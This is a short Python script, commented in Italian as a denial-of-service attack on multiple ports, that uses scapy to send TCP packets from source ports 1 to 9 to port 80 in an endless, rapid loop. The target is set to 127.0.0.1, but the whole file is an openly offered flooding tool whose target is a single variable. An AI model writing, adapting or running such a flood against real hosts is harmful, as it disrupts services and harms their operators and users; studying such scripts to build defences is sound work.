# attacco dos su più porte
from scapy.all import *

ip_src = "127.0.0.1"
ip_target = "127.0.0.1"

count = 1

while True:
    for srcport in range(1, 10):
        IP1 = IP(src=ip_src, dst = ip_target)
        TCP1 = TCP(sport=srcport, dport=80)
        globalLayer = IP1/TCP1
        send(globalLayer, inter=.0001)
        print(f'pacchetto inviato: {count}')
        count = count + 1
